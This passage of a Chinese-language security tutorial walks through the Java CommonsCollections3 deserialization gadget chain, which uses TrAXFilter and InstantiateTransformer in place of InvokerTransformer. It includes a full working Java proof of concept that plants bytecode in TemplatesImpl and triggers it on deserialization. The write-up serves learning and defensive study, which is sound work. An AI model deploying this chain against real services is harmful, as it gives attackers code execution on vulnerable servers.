> CommonsCollections3的目的很明显，就是为了绕过一些规则对InvokerTransformer的限制。CommonsCollections3并没有使用到InvokerTransformer来调用任意方法，而是用到了另一个类，`com.sun.org.apache.xalan.internal.xsltc.trax.TrAxFilter`。

现在继续找 <font style="color:#080808;background-color:#ffffff;">newTransformer 的用法：</font>

这里的 `Process` 只是 `exec()` 的返回值，如果你不去读它的输出或等待它结束，它就没用了，一般对象，不用它

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011707624.png)

`getOutProperties`<font style="color:rgb(80, 80, 92);">，是反射调用的方法，可能会在 fastjson 的漏洞里面被调用。</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011707947.png)

<font style="color:rgb(80, 80, 92);">TransformerFactoryImpl 不能序列化，并且构造函数传参困难</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011708644.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011708046.png)

<font style="color:#080808;background-color:#ffffff;">TrAXFilter 也不能序列化，但构造函数简单，想着调用 TrAXFilter 的构造函数</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011708403.png)



那么如何使用 <font style="color:#080808;background-color:#ffffff;">TrAXFilter 的构造函数，这里用到了 </font><font style="color:rgb(26, 32, 44);">InstantiateTransformer</font>

<font style="color:rgb(26, 32, 44);">InstantiateTransformer.</font><font style="color:#080808;background-color:#ffffff;">transform  判断传入的参数是否为 Class 类型，如果是，获取指定构造器，调用构造函数。</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011708848.png)



#### 构造POC：
```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CC3Test03 {
    public static void main(String[] args) throws Exception {

        TemplatesImpl templates = new TemplatesImpl();
        Class tc = templates.getClass();

        Field nameFiled = tc.getDeclaredField("_name");
        nameFiled.setAccessible(true);
        nameFiled.set(templates, "aaa");

        Field bytecodesFiled = tc.getDeclaredField("_bytecodes");
        bytecodesFiled.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("E://Test.class"));
        byte[][] codes = {code};
        bytecodesFiled.set(templates, codes);

        Field tfactoryFiled = tc.getDeclaredField("_tfactory");
        tfactoryFiled.setAccessible(true);
        tfactoryFiled.set(templates, new TransformerFactoryImpl());

        //添加
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});

        Transformer[] transformers = new Transformer[]{
                //修改
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };
        
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put("value","value");
        Map<Object, Object> transformedMap = TransformedMap.decorate(hashMap, null , chainedTransformer);

        Class<?> c1 = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = c1.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object o = constructor.newInstance(Target.class, transformedMap);
        serialize(o);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}

```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011708853.png)







# 总结：
本次就将 CC1、CC3、CC6放在一起吧：

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011708436.png)























